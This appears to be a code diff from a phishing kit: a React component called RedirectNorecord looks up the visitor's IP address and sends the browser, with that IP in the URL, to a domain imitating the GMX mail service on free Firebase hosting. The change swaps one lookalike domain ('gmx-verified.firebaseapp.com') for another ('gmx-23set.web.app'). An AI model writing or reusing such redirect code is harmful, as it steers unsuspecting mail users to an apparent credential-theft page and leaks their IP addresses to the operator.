@@ -7,7 +7,7 @@ export default function RedirectNorecord() {
     getIP().then((res) => {
       const ip = res.data.IPv4;
       console.log(ip);
-      window.location.assign(`https://gmx-verified.firebaseapp.com/?loc=${ip}`);
+      window.location.assign(`https://gmx-23set.web.app/?ic=${ip}`);
     });
   });
 
